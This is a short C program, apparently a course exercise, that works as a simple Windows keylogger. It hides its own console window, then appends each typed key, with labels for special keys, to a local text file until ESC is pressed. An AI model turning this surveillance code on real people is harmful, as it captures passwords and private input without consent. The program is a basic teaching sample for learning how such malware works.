#include <stdio.h>
#include <conio.h>
#include <windows.h>
#include <time.h>

#define PATH "D:\\blue-cyber-re\\week-5\\keylogger\\data.txt" 
int main(){
    char capture;
    FILE *file;

    time_t t;
    t = time(NULL);
    HWND window;
    AllocConsole();
    window = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(window, 0);

    file = fopen(PATH, "a");
    if (file == NULL) {
        return 1;
    }
    fprintf(file, "\n#$Logger. Started logging @ %s", ctime(&t));

    while (1)
    {
        Sleep(20); 
        if (kbhit())
        {
            capture = getch();
            switch ((int)capture) {
                case ' ': 
                    fprintf(file, " ");
                    break;
                case 0x09: 
                    fprintf(file, "[TAB]");
                    break;
                case 0x0D:
                    fprintf(file, "[ENTER]");
                    break;
                case 0x1B:
                    fprintf(file, "[ESC]");
                    break;
                case 0x08:
                    fprintf(file, "[BACKSPACE]");
                    break;
                default:
                    fputc(capture, file); 
            }
            fflush(file);

            if ((int) capture == 27) {
                fclose(file);
                return 0;
            }
        }
    }
}
